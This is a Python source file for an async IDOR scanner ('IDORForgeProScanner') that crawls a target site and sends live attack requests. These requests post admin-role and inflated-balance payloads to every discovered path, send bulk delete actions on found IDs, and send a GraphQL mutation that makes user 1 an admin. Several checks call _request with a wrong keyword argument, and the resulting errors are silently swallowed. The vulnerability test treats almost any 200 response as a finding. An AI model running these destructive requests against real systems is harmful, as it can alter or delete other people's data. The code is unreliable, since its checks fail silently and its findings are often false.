import asyncio
import httpx
from typing import List, Dict, Any, Optional
from urllib.parse import urljoin
import re

class IDORForgeProScanner:
    def __init__(self, target: str, auth_cookies: Optional[Dict] = None, auth_jwt: Optional[str] = None):
        self.target = target if target.startswith(("http://", "https://")) else f"http://{target}"
        self.auth_cookies = auth_cookies or {}
        self.auth_jwt = auth_jwt
        self.client = httpx.AsyncClient(timeout=15.0, follow_redirects=True)
        self.findings: List[Dict] = []
        self.discovered = {"paths": [], "ids": []}

    async def _request(self, method: str, url: str, json_data=None, params=None):
        headers = {"User-Agent": "Vulnora-IDORForgePro/1.0"}
        if self.auth_jwt:
            headers["Authorization"] = f"Bearer {self.auth_jwt}"
        return await self.client.request(
            method, url, json=json_data, params=params, cookies=self.auth_cookies, headers=headers
        )

    async def _discover_endpoints(self):
        discovered = {"paths": set(), "ids": []}
        start_urls = [self.target, urljoin(self.target, "/api"), urljoin(self.target, "/")]
        for url in start_urls:
            try:
                resp = await self._request("GET", url)
                if not resp:
                    continue
                links = re.findall(r'href=["\'](.*?)["\']', resp.text)
                for link in links:
                    if link.startswith(('/', 'http')):
                        full = urljoin(self.target, link) if not link.startswith('http') else link
                        if full.startswith(self.target):
                            discovered["paths"].add(full.replace(self.target, ''))
                if 'application/json' in resp.headers.get('content-type', ''):
                    data = resp.json()
                    self._extract_ids(data, discovered["ids"])
            except:
                continue
        self.discovered["paths"] = list(discovered["paths"])[:20]
        self.discovered["ids"] = list(set(discovered["ids"]))[:10]

    def _extract_ids(self, data, ids_list):
        if isinstance(data, dict):
            for k, v in data.items():
                if isinstance(v, (int, str)) and str(v).isdigit() and int(v) > 0:
                    ids_list.append(str(v))
                elif isinstance(v, (list, dict)):
                    self._extract_ids(v, ids_list)
        elif isinstance(data, list):
            for item in data:
                self._extract_ids(item, ids_list)

    def _is_vulnerable(self, resp: httpx.Response, check_name: str) -> bool:
        if not resp or resp.status_code not in (200, 201, 204):
            return False
        text = resp.text.lower()
        if any(x in text for x in ["error", "forbidden", "unauthorized", "access denied"]):
            return False
        return True

    async def run(self) -> List[Dict]:
        await self._discover_endpoints()
        checks = [
            self._deep_role_permission_idor,
            self._write_only_idor,
            self._graphql_object_manipulation,
            self._bulk_operation_idor,
            self._multi_step_business_logic_bypass
        ]
        for check in checks:
            try:
                await check()
            except Exception:
                pass
        await self.client.aclose()
        return self.findings

    async def _deep_role_permission_idor(self):
        test_ids = self.discovered["ids"] or ["1", "2", "999", "admin", "user-123"]
        base_paths = [p for p in self.discovered["paths"] if any(x in p.lower() for x in ["user", "profile", "account"])] or ["/api/user/"]
        for tid in test_ids:
            for base in base_paths:
                url = urljoin(self.target, f"{base}{tid}")
                resp = await self._request("GET", url)
                if self._is_vulnerable(resp, "deep_role_permission_idor"):
                    self.findings.append({
                        "check": "deep_role_permission_idor",
                        "severity": "critical",
                        "title": "Deep Role/Permission IDOR",
                        "description": f"Accessed object {tid} without proper role check",
                        "poc": f"GET {url} → {resp.status_code}",
                        "evidence": resp.text[:300] if resp else ""
                    })

    async def _write_only_idor(self):
        payload = {"balance": 999999, "role": "admin"}
        paths = self.discovered["paths"] or ["/api/profile/update"]
        for path in paths:
            url = urljoin(self.target, path)
            resp = await self._request("POST", url, json=payload)
            if self._is_vulnerable(resp, "write_only_idor"):
                self.findings.append({
                    "check": "write_only_idor",
                    "severity": "high",
                    "title": "Write-Only IDOR",
                    "description": "Able to modify object without read permission",
                    "poc": f"POST {url} with {payload}",
                    "evidence": resp.text[:200] if resp else ""
                })

    async def _graphql_object_manipulation(self):
        gql_url = urljoin(self.target, "/graphql")
        gql_introspect = {"query": "{ __schema { types { name } } }"}
        resp = await self._request("POST", gql_url, json=gql_introspect)
        if resp and "types" in resp.text:
            mutation = {"query": 'mutation { updateUser(id: "1", role: "admin") { success } }'}
            resp2 = await self._request("POST", gql_url, json=mutation)
            if resp2 and self._is_vulnerable(resp2, "graphql_object_manipulation") and "success" in resp2.text:
                self.findings.append({
                    "check": "graphql_object_manipulation",
                    "severity": "critical",
                    "title": "GraphQL Object Manipulation",
                    "description": "Unauthorized GraphQL mutation succeeded",
                    "poc": "GraphQL mutation updateUser with foreign ID",
                    "evidence": resp2.text[:300] if resp2 else ""
                })

    async def _bulk_operation_idor(self):
        bulk_payload = {"ids": self.discovered["ids"][:3] or ["1", "2", "3"], "action": "delete"}
        paths = self.discovered["paths"] or ["/api/bulk/action"]
        for path in paths:
            url = urljoin(self.target, path)
            resp = await self._request("POST", url, json=bulk_payload)
            if self._is_vulnerable(resp, "bulk_operation_idor"):
                self.findings.append({
                    "check": "bulk_operation_idor",
                    "severity": "high",
                    "title": "Bulk-Operation IDOR",
                    "description": "Bulk action succeeded on foreign objects",
                    "poc": f"POST {url} with ids {bulk_payload['ids']}",
                    "evidence": resp.text[:200] if resp else ""
                })

    async def _multi_step_business_logic_bypass(self):
        paths = self.discovered["paths"] or ["/api/workflow/start", "/api/workflow/complete"]
        step1 = await self._request("POST", urljoin(self.target, paths[0]), json={"step": 1})
        if step1 and step1.status_code == 200:
            step_final = await self._request("POST", urljoin(self.target, paths[-1]), json={"step": 5, "bypass": True})
            if self._is_vulnerable(step_final, "multi_step_bypass"):
                self.findings.append({
                    "check": "multi_step_bypass",
                    "severity": "critical",
                    "title": "Multi-Step Business Logic Bypass",
                    "description": "Skipped workflow steps via direct state transition",
                    "poc": "POST /workflow/complete with step=5",
                    "evidence": step_final.text[:200] if step_final else ""
                })
